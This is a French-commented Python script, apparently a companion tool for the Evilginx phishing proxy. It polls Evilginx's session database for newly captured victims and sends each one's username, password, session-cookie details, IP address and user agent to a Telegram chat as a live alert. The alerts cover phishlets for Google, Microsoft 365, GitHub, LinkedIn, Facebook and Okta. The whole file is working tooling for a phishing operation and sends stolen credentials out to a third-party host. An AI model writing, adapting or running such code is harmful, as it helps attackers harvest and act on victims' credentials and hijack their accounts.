#!/usr/bin/env python3
"""
EVILGINX TELEGRAM NOTIFIER
Surveille les sessions capturées par Evilginx Pro et envoie des notifications Telegram

Fonctionnalités:
- Surveillance en temps réel de la base de données Evilginx
- Notifications instantanées sur Telegram
- Support multi-phishlets
- Formatage riche des messages
- Logs détaillés

Auteur: @security
Version: 1.0
Date: 25 décembre 2025
"""

import os
import sys
import time
import json
import sqlite3
import logging
import requests
from datetime import datetime
from pathlib import Path
import signal

# ============================================================================
# CONFIGURATION
# ============================================================================

# Configuration Telegram (À MODIFIER)
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Token du bot Telegram
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"      # ID du chat/groupe

# Configuration Evilginx
EVILGINX_DB_PATH = os.path.expanduser("~/.evilginx/data.db")
CHECK_INTERVAL = 10  # Secondes entre chaque vérification

# Configuration Logs
LOG_FILE = "/tmp/telegram_notifier.log"
LOG_LEVEL = logging.INFO

# Configuration du système
STATE_FILE = "/tmp/telegram_notifier_state.json"

# ============================================================================
# LOGGER
# ============================================================================

logging.basicConfig(
    level=LOG_LEVEL,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============================================================================
# GESTION DE L'ÉTAT
# ============================================================================

class StateManager:
    """Gère l'état des sessions déjà notifiées"""
    
    def __init__(self, state_file):
        self.state_file = state_file
        self.notified_sessions = self.load_state()
    
    def load_state(self):
        """Charge l'état depuis le fichier"""
        if os.path.exists(self.state_file):
            try:
                with open(self.state_file, 'r') as f:
                    data = json.load(f)
                    return set(data.get('notified_sessions', []))
            except Exception as e:
                logger.warning(f"Erreur lors du chargement de l'état: {e}")
                return set()
        return set()
    
    def save_state(self):
        """Sauvegarde l'état dans le fichier"""
        try:
            with open(self.state_file, 'w') as f:
                json.dump({
                    'notified_sessions': list(self.notified_sessions),
                    'last_update': datetime.now().isoformat()
                }, f, indent=2)
        except Exception as e:
            logger.error(f"Erreur lors de la sauvegarde de l'état: {e}")
    
    def is_notified(self, session_id):
        """Vérifie si une session a déjà été notifiée"""
        return str(session_id) in self.notified_sessions
    
    def mark_notified(self, session_id):
        """Marque une session comme notifiée"""
        self.notified_sessions.add(str(session_id))
        self.save_state()

# ============================================================================
# TELEGRAM API
# ============================================================================

class TelegramNotifier:
    """Gère l'envoi de notifications Telegram"""
    
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.api_url = f"https://api.telegram.org/bot{bot_token}"
    
    def send_message(self, text, parse_mode='HTML'):
        """Envoie un message texte sur Telegram"""
        try:
            url = f"{self.api_url}/sendMessage"
            payload = {
                'chat_id': self.chat_id,
                'text': text,
                'parse_mode': parse_mode
            }
            response = requests.post(url, json=payload, timeout=10)
            
            if response.status_code == 200:
                logger.info("Message Telegram envoyé avec succès")
                return True
            else:
                logger.error(f"Erreur Telegram: {response.status_code} - {response.text}")
                return False
                
        except Exception as e:
            logger.error(f"Erreur lors de l'envoi du message Telegram: {e}")
            return False
    
    def send_session_notification(self, session_data):
        """Envoie une notification formatée pour une session capturée"""
        
        # Émojis pour le formatage
        emoji_map = {
            'google': '📧',
            'microsoft365': '💼',
            'github': '🐙',
            'linkedin': '💼',
            'facebook': '👥',
            'okta': '🔐'
        }
        
        phishlet = session_data.get('phishlet', 'unknown')
        emoji = emoji_map.get(phishlet.lower(), '🎣')
        
        # Formatage du message
        message = f"""
🎯 <b>NOUVELLE SESSION CAPTURÉE</b> {emoji}

<b>📋 Informations</b>
├─ <b>Phishlet:</b> {session_data.get('phishlet', 'N/A')}
├─ <b>Session ID:</b> #{session_data.get('id', 'N/A')}
├─ <b>Timestamp:</b> {session_data.get('timestamp', 'N/A')}

<b>👤 Credentials</b>
├─ <b>Username:</b> <code>{session_data.get('username', 'N/A')}</code>
└─ <b>Password:</b> <code>{session_data.get('password', 'N/A')[:20]}{'...' if len(session_data.get('password', '')) > 20 else ''}</code>

<b>🍪 Cookies</b>
├─ <b>Captured:</b> {session_data.get('cookies_count', 0)} cookies
└─ <b>Domains:</b> {', '.join(session_data.get('cookie_domains', ['N/A'])[:3])}

<b>🌐 Source</b>
├─ <b>IP:</b> <code>{session_data.get('remote_ip', 'N/A')}</code>
├─ <b>Country:</b> {session_data.get('country', 'N/A')}
└─ <b>User-Agent:</b> {session_data.get('user_agent', 'N/A')[:50]}...

<b>⏱️ Status:</b> ✅ <b>ACTIVE</b>

━━━━━━━━━━━━━━━━━━━━━
🔔 Evilginx Pro Notifier
        """
        
        return self.send_message(message.strip())
    
    def send_startup_notification(self):
        """Envoie une notification de démarrage"""
        message = """
🚀 <b>EVILGINX NOTIFIER STARTED</b>

✅ Le monitoring des sessions est actif
📡 Surveillance en temps réel activée

<b>Configuration:</b>
├─ Check interval: """ + str(CHECK_INTERVAL) + """ secondes
├─ Database: """ + EVILGINX_DB_PATH + """
└─ Status: 🟢 ONLINE

━━━━━━━━━━━━━━━━━━━━━
🔔 Evilginx Pro Notifier
        """
        return self.send_message(message.strip())
    
    def send_error_notification(self, error_msg):
        """Envoie une notification d'erreur"""
        message = f"""
⚠️ <b>ERREUR DÉTECTÉE</b>

<b>Message:</b>
<code>{error_msg}</code>

<b>Timestamp:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

━━━━━━━━━━━━━━━━━━━━━
🔔 Evilginx Pro Notifier
        """
        return self.send_message(message.strip())
    
    def test_connection(self):
        """Teste la connexion au bot Telegram"""
        try:
            url = f"{self.api_url}/getMe"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                bot_info = response.json()
                logger.info(f"Connexion Telegram OK - Bot: {bot_info['result']['username']}")
                return True
            else:
                logger.error(f"Erreur de connexion Telegram: {response.status_code}")
                return False
                
        except Exception as e:
            logger.error(f"Erreur lors du test de connexion Telegram: {e}")
            return False

# ============================================================================
# EVILGINX DATABASE MONITOR
# ============================================================================

class EvilginxMonitor:
    """Surveille la base de données Evilginx pour les nouvelles sessions"""
    
    def __init__(self, db_path):
        self.db_path = db_path
        self.last_session_id = self.get_last_session_id()
    
    def get_connection(self):
        """Crée une connexion à la base de données"""
        try:
            conn = sqlite3.connect(self.db_path)
            conn.row_factory = sqlite3.Row
            return conn
        except Exception as e:
            logger.error(f"Erreur de connexion à la DB: {e}")
            return None
    
    def get_last_session_id(self):
        """Récupère l'ID de la dernière session"""
        conn = self.get_connection()
        if not conn:
            return 0
        
        try:
            cursor = conn.cursor()
            cursor.execute("SELECT MAX(id) as max_id FROM sessions")
            result = cursor.fetchone()
            conn.close()
            return result['max_id'] if result['max_id'] else 0
        except Exception as e:
            logger.error(f"Erreur lors de la récupération du dernier ID: {e}")
            return 0
    
    def get_new_sessions(self):
        """Récupère les nouvelles sessions depuis le dernier check"""
        conn = self.get_connection()
        if not conn:
            return []
        
        try:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM sessions 
                WHERE id > ? 
                ORDER BY id ASC
            """, (self.last_session_id,))
            
            sessions = cursor.fetchall()
            conn.close()
            
            return [dict(session) for session in sessions]
            
        except Exception as e:
            logger.error(f"Erreur lors de la récupération des sessions: {e}")
            return []
    
    def parse_session_data(self, session_row):
        """Parse les données d'une session"""
        try:
            # Extraction des données de base
            session_data = {
                'id': session_row.get('id'),
                'phishlet': session_row.get('phishlet', 'unknown'),
                'username': session_row.get('username', 'N/A'),
                'password': session_row.get('password', 'N/A'),
                'remote_ip': session_row.get('remote_addr', 'N/A'),
                'user_agent': session_row.get('useragent', 'N/A'),
                'timestamp': session_row.get('create_time', datetime.now().isoformat()),
                'country': 'N/A'  # Peut être enrichi avec une API GeoIP
            }
            
            # Parse des cookies (stockés en JSON généralement)
            cookies_raw = session_row.get('tokens', '{}')
            try:
                if isinstance(cookies_raw, str):
                    cookies = json.loads(cookies_raw)
                else:
                    cookies = cookies_raw
                
                session_data['cookies_count'] = len(cookies)
                session_data['cookie_domains'] = list(set([
                    cookie.get('domain', 'unknown') 
                    for cookie in cookies 
                    if isinstance(cookie, dict)
                ]))
            except:
                session_data['cookies_count'] = 0
                session_data['cookie_domains'] = ['N/A']
            
            return session_data
            
        except Exception as e:
            logger.error(f"Erreur lors du parsing de la session: {e}")
            return None
    
    def check_new_sessions(self):
        """Vérifie les nouvelles sessions"""
        new_sessions = self.get_new_sessions()
        
        if new_sessions:
            logger.info(f"Trouvé {len(new_sessions)} nouvelle(s) session(s)")
            
            # Mise à jour du dernier ID
            self.last_session_id = max([s['id'] for s in new_sessions])
        
        return new_sessions

# ============================================================================
# MAIN APPLICATION
# ============================================================================

class EvilginxTelegramNotifier:
    """Application principale"""
    
    def __init__(self):
        self.state_manager = StateManager(STATE_FILE)
        self.telegram = TelegramNotifier(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
        self.monitor = EvilginxMonitor(EVILGINX_DB_PATH)
        self.running = True
    
    def validate_config(self):
        """Valide la configuration"""
        errors = []
        
        if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
            errors.append("TELEGRAM_BOT_TOKEN non configuré")
        
        if TELEGRAM_CHAT_ID == "YOUR_CHAT_ID_HERE":
            errors.append("TELEGRAM_CHAT_ID non configuré")
        
        if not os.path.exists(EVILGINX_DB_PATH):
            errors.append(f"Base de données introuvable: {EVILGINX_DB_PATH}")
        
        if errors:
            for error in errors:
                logger.error(f"❌ {error}")
            return False
        
        return True
    
    def setup_signal_handlers(self):
        """Configure les handlers de signaux"""
        def signal_handler(sig, frame):
            logger.info("Signal d'arrêt reçu, fermeture propre...")
            self.running = False
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
    
    def run(self):
        """Boucle principale"""
        logger.info("=" * 60)
        logger.info("EVILGINX TELEGRAM NOTIFIER - DÉMARRAGE")
        logger.info("=" * 60)
        
        # Validation
        if not self.validate_config():
            logger.error("Configuration invalide, arrêt.")
            sys.exit(1)
        
        # Test connexion Telegram
        if not self.telegram.test_connection():
            logger.error("Impossible de se connecter à Telegram, arrêt.")
            sys.exit(1)
        
        # Setup signal handlers
        self.setup_signal_handlers()
        
        # Notification de démarrage
        self.telegram.send_startup_notification()
        
        logger.info(f"Surveillance de: {EVILGINX_DB_PATH}")
        logger.info(f"Intervalle de vérification: {CHECK_INTERVAL}s")
        logger.info("Monitoring actif...")
        
        # Boucle principale
        while self.running:
            try:
                # Vérifier les nouvelles sessions
                new_sessions = self.monitor.check_new_sessions()
                
                for session_row in new_sessions:
                    session_id = session_row['id']
                    
                    # Skip si déjà notifié
                    if self.state_manager.is_notified(session_id):
                        continue
                    
                    # Parser les données
                    session_data = self.monitor.parse_session_data(session_row)
                    
                    if session_data:
                        # Envoyer notification
                        logger.info(f"Nouvelle session #{session_id} - {session_data['phishlet']}")
                        
                        if self.telegram.send_session_notification(session_data):
                            self.state_manager.mark_notified(session_id)
                            logger.info(f"✅ Session #{session_id} notifiée")
                        else:
                            logger.error(f"❌ Échec notification session #{session_id}")
                
                # Attendre avant la prochaine vérification
                time.sleep(CHECK_INTERVAL)
                
            except KeyboardInterrupt:
                logger.info("Interruption clavier détectée")
                break
            except Exception as e:
                logger.error(f"Erreur dans la boucle principale: {e}")
                self.telegram.send_error_notification(str(e))
                time.sleep(CHECK_INTERVAL)
        
        logger.info("Arrêt du notifier Telegram")

# ============================================================================
# POINT D'ENTRÉE
# ============================================================================

def main():
    """Point d'entrée principal"""
    try:
        app = EvilginxTelegramNotifier()
        app.run()
    except Exception as e:
        logger.error(f"Erreur fatale: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
